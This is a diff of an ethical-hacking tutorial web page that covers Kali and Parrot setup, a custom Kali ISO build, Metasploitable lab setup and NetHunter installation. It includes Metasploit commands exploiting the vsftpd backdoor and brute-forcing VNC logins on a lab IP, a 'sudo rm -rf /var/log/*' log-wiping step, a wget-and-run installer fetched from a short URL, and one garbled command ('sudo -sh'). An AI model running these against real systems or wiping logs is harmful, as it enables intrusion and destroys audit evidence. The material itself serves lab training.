@@ -26,6 +26,7 @@
          <option value="slate">Slate</option>
       </select>
    </div>
+
    <div class="container">
       <!--Menu Icon -->
       <div class="menu-icon" onclick="toggleMenu()">
@@ -43,17 +44,17 @@
          </div>
 
          <ul class="topics-list">
-            <li><a href="../Reconnaissance/">Reconnaissance(Info gathering) Phase</a></li>
+            <li><a href="../Reconnaissance/">1. Reconnaissance Phase</a></li>
             <li><a href="../Scanning/">Scanning Phase</a></li>
             <li><a href="../Gaining_Access/">Gaining Access Phase</a></li>
             <li><a href="../Maintaining_Access/">Maintaining Access</a></li>
             <li><a href="../Clearing_Tracks/">Clearing Tracks</a></li>
             <li><a href="../Analysis_Reporting/">Analysis and Reporting</a></li>
-            <li><a href="../AI_Tools/">Cyber security with AI</a></li>
+            <li><a href="../AI_Tools/">AI in Cyber Securiy</a></li>
             <li><a href="../Bug_Bounty_Hunting/">Bug Bounty Hunting</a></li>
             <li><a href="../Cryptography/">Cryptography</a></li>
-            <li><a href="../CTFs/">Capture The Flag(CTF) Challenges</a></li>
-            <li><a href="../DFIR/">Digital Forensics & Incident Response (DFIR)</a></li>
+            <li><a href="../CTFs/">Capture The Flag(CTF)</a></li>
+            <li><a href="../DFIR/">Digital Forensics &amp; Incident Response</a></li>
             <li><a href="../Malware/">Malware Analysis</a></li>
             <li><a href="../Post_Exploitation/">Post Exploitation Phase</a></li>
             <li><a href="../Reverse_Engineering/">Reverse Engineering</a></li>
@@ -70,7 +71,7 @@
                   vulnerabilities in computer systems, networks or applications to improve
                   their security.</p>
 
-               <h2>Quick tips for beginners </h2>
+               <h2>Quick tips for beginners</h2>
                <p> 📌Understand first then hack.
                   <br>📌Don’t get intimidated by a scope, break it down into functions.
                   <br>📌Don’t assume everything has been found.
@@ -90,7 +91,7 @@
                   <li>The Children Online Privacy Protection Act</li>
                </ol>
                <h2 id="security-operations">Security operations</h2>
-               <ul>
+               <ul type="1">
                   <li>Detection</li>
                   <li>Protection</li>
                   <li>Active defense</li>
@@ -136,15 +137,15 @@
                   <li>Open source</li>
                </ul>
                <h3>Frameworks &amp; standards.</h3>
-               <ul>
-                  <li>NIST</li>
-                  <li>ISO/IEC</li>
-                  <li>CSF</li>
-                  <li>CIS</li>
-                  <li>RMF</li>
-                  <li>CISA</li>
-                  <li>SANS/CSC</li>
-               </ul>
+               <p>1. NIST
+                  <br>2. ISO/IEC
+                  <br>3. CSF
+                  <br>4. CIS
+                  <br>5. RMF
+                  <br>6. CISA
+                  <br>7. SANS/CSC
+               </p>
+
 
                <h2>Hacking Motives/goals</h2>
                <ol type="1">
@@ -400,10 +401,10 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-                  $sudo apt install kali-desktop-lxqt -y
-                  $sudo apt install openbox obconf obmenu -y
-                  $sudo apt remove --purge kali-desktop-xfce -y
-                  $sudo apt autoremove -y
+$sudo apt install kali-desktop-lxqt -y 
+$sudo apt install openbox obconf obmenu -y
+$sudo apt remove --purge kali-desktop-xfce -y
+$sudo apt autoremove -y
                     </code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
@@ -413,10 +414,9 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-
-                  $dpkg --get-selections | grep kali
-                  $sudo apt remove --purge kali-linux-forensic kali-linux-voip kali-linux-wireless -y
-                  $sudo apt autoremove -y
+$dpkg --get-selections | grep kali
+$sudo apt remove --purge kali-linux-forensic kali-linux-voip kali-linux-wireless -y
+$sudo apt autoremove -y
                     </code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
@@ -425,8 +425,8 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-                  $sudo apt remove --purge kali-linux-default -y
-                  $sudo apt autoremove -y
+$sudo apt remove --purge kali-linux-default -y
+$sudo apt autoremove -y
                     </code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
@@ -438,7 +438,7 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-                  $systemctl list-unit-files --type=service | grep enabled
+$systemctl list-unit-files --type=service | grep enabled
                      </code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
@@ -446,8 +446,8 @@
                   <p>Disable Unnecessary Services</p>
                   <div class="code-block">
                      <pre><code class="language-bash"> 
-                        $sudo systemctl disable $bluetooth.service
-                        $sudo systemctl stop bluetooth.service</code></pre>
+$sudo systemctl disable $bluetooth.service
+$sudo systemctl stop bluetooth.service</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -457,7 +457,7 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-                  $sudo systemctl disable NetworkManager-wait-online.service</code></pre>
+$sudo systemctl disable NetworkManager-wait-online.service</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -467,23 +467,26 @@
                   <p>Remove Old Dependencies &amp; Cached Packages</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                           $sudo apt autoremove -y
-                           $sudo apt clean -y
-                        $sudo apt autoclean -y</code></pre>
+$sudo apt autoremove -y
+$sudo apt clean -y
+$sudo apt autoclean -y</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
 
                   <p>Delete Log Files</p>
-                  <div>
-                     <pre><code>$sudo rm -rf /var/log/*</code></pre>
-                  </div>
-
-                  <p>Check for Large Unused Files &amp; clear it:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                        $du -sh /var/cache/apt
-                        $sudo rm -rf /var/cache/apt/archives/*</code></pre>
+$sudo rm -rf /var/log/*
+$sudo journalctl --vacuum-time=7d</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>Check for Large unused Files &amp; clear it</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+$sudo -sh /var/cache/apt
+$sudo rm -rf /var/cache/apt/archives/*</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -494,8 +497,8 @@
 
                   <div class="code-block">
                      <pre><code class="language-bash">
-                        $sudo apt install zram-tools -y
-                        $sudo systemctl enable --now zramswap.service</code></pre>
+ $sudo apt install zram-tools -y
+ $sudo systemctl enable --now zramswap.service</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -503,8 +506,8 @@
                   <p>Reduce Swappiness</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $echo &#39;vm.swappiness=10&#39; | sudo tee -a /etc/sysctl.conf
-                     $sudo sysctl -p</code></pre>
+$echo &#39;vm.swappiness=10&#39; | sudo tee -a /etc/sysctl.conf
+$sudo sysctl -p</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -513,7 +516,7 @@
                   <p>Disable Unnecessary Boot Services</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                        $systemctl list-unit-files --type=service --state=enabled</code></pre>
+$systemctl list-unit-files --type=service --state=enabled</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -521,15 +524,15 @@
                   <p>Disable unnecessary services</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $sudo systemctl disable &lt;service-name&gt;</code></pre>
+$sudo systemctl disable &lt;service-name&gt;</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
                   <p>Use Systemd-analyze to Check Boot Time</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $systemd-analyze
-                     $systemd-analyze blame</code></pre>
+$systemd-analyze
+$systemd-analyze blame</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -538,7 +541,7 @@
                   <p>Use a Fast DNS Resolver, Edit /etc/resolv.conf:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                        $sudo nano /etc/resolv.conf</code></pre>
+$sudo nano /etc/resolv.conf</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -547,7 +550,7 @@
                   <p>Then, prevent automatic changes:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                           $sudo chattr +i /etc/resolv.conf</code></pre>
+$sudo chattr +i /etc/resolv.conf</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -556,7 +559,7 @@
                   <p>Instead of using GNOME Terminal, switch to Alacritty or Kitty:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                              $sudo apt install alacritty -y</code></pre>
+$sudo apt install alacritty -y</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -566,7 +569,7 @@
                   <p>You can install a minimal kernel for lower RAM usage:</p>
                   <div class="code-block">
                      <pre><code>
-                        $sudo apt install linux-image-rt-amd64 -y</code></pre>
+$sudo apt install linux-image-rt-amd64 -y</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -588,8 +591,8 @@
                   <p>Install live-build and Dependencies</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                           $sudo apt update &amp;&amp; 
-                           $sudo apt install -y live-build cdebootstrap curl git</code></pre>
+$sudo apt update &amp;&amp; 
+$sudo apt install -y live-build cdebootstrap curl git</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -597,15 +600,15 @@
                   <p>Clone the Kali Linux ISO Builder</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
-                     $cd live-build-config</code></pre>
+$git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
+$cd live-build-config</code></pre>
                   </div>
 
 
                   <p>Remove Unnecessary Packages</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                           $nano kali-config/variant-default/package-lists/kali.list.chroot</code></pre>
+$nano kali-config/variant-default/package-lists/kali.list.chroot</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -627,7 +630,7 @@
                   <h2>Optimize System Settings</h2>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $nano kali-config/common/includes.chroot/etc/sysctl.conf</code></pre>
+$nano kali-config/common/includes.chroot/etc/sysctl.conf</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -635,10 +638,10 @@
                   <p>Add:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     vm.swappiness=10
-                     fs.inotify.max_user_watches=524288
-                     net.core.default_qdisc=fq
-                     net.ipv4.tcp_congestion_control=bbr</code></pre>
+vm.swappiness=10
+fs.inotify.max_user_watches=524288
+net.core.default_qdisc=fq
+net.ipv4.tcp_congestion_control=bbr</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
                   <p>Save and exit.</p>
@@ -648,23 +651,23 @@
                   <p>Disable unnecessary services by creating a script</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                           $nano kali-config/common/hooks/00-disable-services.chroot</code></pre>
+$nano kali-config/common/hooks/00-disable-services.chroot</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
                   <p>Add:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     #!/bin/bash
-                     systemctl disable bluetooth.service
-                     systemctl disable NetworkManager-wait-online.service
-                     systemctl disable ModemManager.service</code></pre>
+#!/bin/bash
+systemctl disable bluetooth.service
+systemctl disable NetworkManager-wait-online.service
+systemctl disable ModemManager.service</code></pre>
                   </div>
 
                   <p>Save, then make it executable:</p>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                     $chmod +x kali-config/common/hooks/00-disable-services.chroot</code></pre>
+$chmod +x kali-config/common/hooks/00-disable-services.chroot</code></pre>
                   </div>
 
 
@@ -672,14 +675,16 @@
                   <p>Run the following command to start the ISO build process:</p>
                   <div class="code-block">
                      <pre><code>
-                        $sudo ./build.sh --variant default --verbose</code></pre>
+$sudo ./build.sh --variant default --verbose</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
+
                   <p>This will take some time depending on your system's performance.</p>
                   <p>Test Your Custom Kali ISO</p>
                   <p>Once the build is done, find your ISO in the images/ folder</p>
                   <div class="code-block">
-                     <pre><code>$ls -lh images/</code></pre>
+                     <pre><code>
+$ls -lh images/</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
                   <p>Now, test it in VMware or VirtualBox:</p>
@@ -698,9 +703,9 @@
                   <h1>Parrot Security OS.</h1>
                   <div class="code-block">
                      <pre><code class="language-bash">
-                  $sudo su
-                  $passwd root
-                  $sudo apt update &amp;&amp; apt upgrade -y</code></pre>
+$sudo su
+$passwd root
+$sudo apt update &amp;&amp; apt upgrade -y</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -748,10 +753,10 @@
                   <p>Metasploit Interfaces <br> 1. MsfConsole <br> 2. Armitage - GUI</p>
                   <div class="code-block">
                      <pre><code class="language-bash">   
-                     $sudo apt install armitage
-                     $service postresql start
-                     $sudo armitage
-                     $service metasploit start</code></pre>
+$sudo apt install armitage
+$service postresql start
+$sudo armitage
+$service metasploit start</code></pre>
                      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                   </div>
 
@@ -812,7 +817,7 @@
                      </ul>
                      <ol start="6" type="1">
                         <li>
-                           <p>Scanner - automated scanning </p>
+                           <p>Scanner - automated scanning</p>
                         </li>
                         <li>
                            <p>Spider</p>
@@ -860,12 +865,12 @@
                      <p>Vmware</p>
                      <div class="code-block">
                         <pre><code class="language-bash">
-                        &gt;Vagrant plugin install vagrant-vmware-desktop
-                        &gt;vagrant plugin install vagrant-reload
-                        &gt;vagrant box list
-                        &gt;vagrant box add rapid7/metasploitable3-win2k8 --provider vmware_desktop
-                        &gt;vagrant box remove rapid7/metasploitable3-ub1404 --provider vmware_desktop
-                        &gt;vagrant up OR &gt;vagrant up win2k8</code></pre>
+&gt;Vagrant plugin install vagrant-vmware-desktop
+&gt;vagrant plugin install vagrant-reload
+&gt;vagrant box list
+&gt;vagrant box add rapid7/metasploitable3-win2k8 --provider vmware_desktop
+&gt;vagrant box remove rapid7/metasploitable3-ub1404 --provider vmware_desktop
+&gt;vagrant up OR &gt;vagrant up win2k8</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -873,9 +878,9 @@
                      <p>In vagrant directrory</p>
                      <div class="code-block">
                         <pre><code class="language-bash">
-                        &gt;slmgr /rearm
-                        &gt;. \build.ps1
-                         &gt;. \build.ps1 windows2008 or Ubuntu 1404</code></pre>
+&gt;slmgr /rearm
+&gt;. \build.ps1
+&gt;. \build.ps1 windows2008 or Ubuntu 1404</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -883,11 +888,11 @@
                      <p>Virtual box</p>
                      <div class="code-block">
                         <pre><code class="language-bash">
-                           &gt;vagrant plugin install vagrant-vbguest
-                           &gt;vagrant plugin install vagrant-reload
-                           &gt;set-ExecutionPolicy Unrestricted
-                           &gt;.\build.ps1
-                           &gt;.\build.ps1 windows2008 or Ubuntu 1404</code></pre>
+&gt;vagrant plugin install vagrant-vbguest
+&gt;vagrant plugin install vagrant-reload
+&gt;set-ExecutionPolicy Unrestricted
+&gt;.\build.ps1
+&gt;.\build.ps1 windows2008 or Ubuntu 1404</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -895,11 +900,11 @@
                      <p>OR</p>
                      <div class="code-block">
                         <pre><code>
-                           &gt;. \packer.exe build. \windows_10_choco.json
-                           &gt;Vagrant box add win10 windows_10_virtualbox.box
-                           &gt;cd win10
-                           &gt;vagrant init win10
-                           &gt;vagrant up</code></pre>
+&gt;. \packer.exe build. \windows_10_choco.json
+&gt;Vagrant box add win10 windows_10_virtualbox.box
+&gt;cd win10
+&gt;vagrant init win10
+&gt;vagrant up</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -948,33 +953,33 @@
                      <h2>Penetration testing on metasploitable 2</h2>
                      <div class="code-block">
                         <pre><code class="language-absh">
-                        $ifconfig #run this on target machine (metasploitable 2)
-                        $nmap -sV -O 172.16.225.128
-                        $msfconsole</code></pre>
+$ifconfig #run this on target machine (metasploitable 2)
+$nmap -sV -O 172.16.225.128
+$msfconsole</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
                      <h2>Very Secure FTP exploitaion</h2>
                      <div class="code-block">
                         <pre><code>
-                           $msfconsole
-                           msf6&gt;search vsftpd
-                           msf6&gt;use exploit/unix/ftp/vsftpd_234_backdoor
-                           msf6&gt;set RHOST 172.16.225.128
-                           msf6&gt;run</code></pre>
-                        <p>metepreter&gt;whoami</p>
+$msfconsole
+msf6&gt;search vsftpd
+msf6&gt;use exploit/unix/ftp/vsftpd_234_backdoor
+msf6&gt;set RHOST 172.16.225.128
+msf6&gt;run</code></pre>
+<p>metepreter&gt;whoami</p>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
                      <h2>VNC Remote Login Exploitation</h2>
                      <div class="code-block">
                         <pre><code class="language-bash">
-                           $msfconsole
-                           &gt;search vnc login
-                           &gt;use auxiliary/scanner/vnc/vnc_login
-                           &gt;set RHOST 172.16.225.128
-                           &gt;run
-                           $vncviewer 172.16.225.128</code></pre>
+$msfconsole
+&gt;search vnc login
+&gt;use auxiliary/scanner/vnc/vnc_login
+&gt;set RHOST 172.16.225.128
+&gt;run
+$vncviewer 172.16.225.128</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -1006,16 +1011,16 @@
                      <h3>Enabling OEM before rooting</h3>
                      <div class="code-block">
                         <pre><code class="language-bash">
-                           $adb reboot recovery
-                           $adb devices
-                           $adb sideload update.zip
-                           $termux-setup-storage
-                           $wget -O install-nethunter-termux https://offsec/zMcrZWr
-                           $chmod +x install-nethunter-termux
-                           $./install-nethunter-termux
-                           $nethunter -r -&gt; root access
-                           $kex passwd -&gt; set VNC password
-                          $kex &amp; -&gt; launch VNC server</code></pre>
+$adb reboot recovery
+$adb devices
+$adb sideload update.zip
+$termux-setup-storage
+$wget -O install-nethunter-termux https://offsec/zMcrZWr
+$chmod +x install-nethunter-termux
+$./install-nethunter-termux
+$nethunter -r -&gt; root access
+$kex passwd -&gt; set VNC password
+$kex &amp; -&gt; launch VNC server</code></pre>
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                      </div>
 
@@ -1144,7 +1149,8 @@
                   <!----------------Bottom Navigation ------------------>
 
                   <div class="book-navigation">
-                     <button class="top-page" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
+                     <button class="top-page"
+                        onclick="document.getElementById('right-column').scrollTo({ top: 0, behavior: 'smooth' });">
                         <img src="../assets/icons/back-to-top.svg" alt="Top" class="icon">Top
                      </button>
                      <button class="next-page" data-next-page="../Reconnaissance/">
